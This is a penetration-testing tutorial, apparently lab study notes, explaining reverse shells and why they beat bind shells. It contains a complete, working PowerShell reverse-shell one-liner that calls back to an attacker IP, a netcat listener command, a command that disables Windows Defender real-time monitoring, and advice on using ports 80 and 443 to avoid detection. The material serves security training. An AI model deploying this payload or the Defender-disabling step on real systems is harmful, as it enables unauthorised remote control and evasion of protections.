

# Reverse Shells

A **reverse shell** is a shell where the **attacker starts a listener**, and the **target initiates the connection back** to the attacker.

This is the most commonly used shell type in real-world penetration testing because it is **far more reliable** than a bind shell.

---

## What Is a Reverse Shell?

With a reverse shell:

* The **attack box listens** on a port
* The **target connects outbound** to the attacker
* The attacker receives an interactive shell

### Connection Direction

```
Target  →  Attacker:PORT
```

### Example

* Attacker (listener): `10.10.14.15:1337`
* Target (client): `10.10.14.20`

The target connects back to the attacker’s system.

---

## Why Reverse Shells Are Preferred

Reverse shells work better in real environments because:

* **Outbound traffic is usually allowed**

  * Firewalls often permit outbound HTTP/HTTPS
* **Inbound connections are heavily restricted**

  * Bind shells are commonly blocked
* **NAT and PAT do not interfere**
* **Less likely to trigger alerts**

  * Especially when using common ports like `80` or `443`

Because of this, reverse shells are the **default choice** for most exploitation scenarios.

---

## Reverse Shell Workflow

1. Attacker starts a listener
2. Attacker exploits a vulnerability (e.g., command injection, file upload)
3. Target executes a payload
4. Target initiates an outbound connection
5. Attacker receives a shell

---

## Common Reverse Shell Delivery Methods

* Command Injection
* File Upload (web shell, executable)
* Exploits (RCE)
* Scheduled tasks
* Living-off-the-land binaries

---

## Using Common Ports

Reverse shells often use:

* `80` (HTTP)
* `443` (HTTPS)
* `53` (DNS, advanced)

These ports are rarely blocked outbound.

Note: Advanced firewalls using deep packet inspection can still detect malicious traffic, even on common ports.

---

## Hands-On: Reverse Shell on Windows Using PowerShell

### Step 1: Start Listener on the Attack Box

On the **attack box**:

```bash
sudo nc -lvnp 443
```

This starts a listener on port `443`.

---

### Step 2: Execute Reverse Shell Payload on the Target

On the **Windows target**, open Command Prompt and run:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Important Notes

* `-nop` disables PowerShell profiles
* `TCPClient` initiates a connection to the attacker
* `iex` executes commands received over the socket
* Input/output is redirected back to the attacker

This payload is the **reverse shell code**.

---

## Antivirus Detection

When executed, Windows Defender may block the payload:

```
This script contains malicious content and has been blocked by your antivirus software.
```

This is expected behavior.

---

## Disabling Windows Defender (Lab Only)

For lab purposes only, disable real-time monitoring from an **administrator PowerShell**:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Then execute the payload again.

---

## Successful Reverse Shell

On the **attack box**, you should see:

```
Connection received on 10.129.36.68 49674
PS C:\Users\htb-student>
```

Verify access:

```powershell
whoami
```

Example output:

```
ws01\htb-student
```

You now have:

* Command execution
* Filesystem access
* Interactive PowerShell session

---

## Reverse Shell vs Bind Shell

| Feature              | Bind Shell        | Reverse Shell     |
| -------------------- | ----------------- | ----------------- |
| Listener             | Target            | Attacker          |
| Connection Direction | Attacker → Target | Target → Attacker |
| Firewall Friendly    | No                | Yes               |
| Real-World Usage     | Rare              | Very Common       |
| Detection Risk       | High              | Lower             |

---

## Key Takeaways

* Reverse shells are the **standard choice** in penetration testing
* They bypass inbound firewall restrictions
* PowerShell is a powerful native Windows tool
* Antivirus and EDR are major obstacles
* Payload delivery is often harder than payload creation

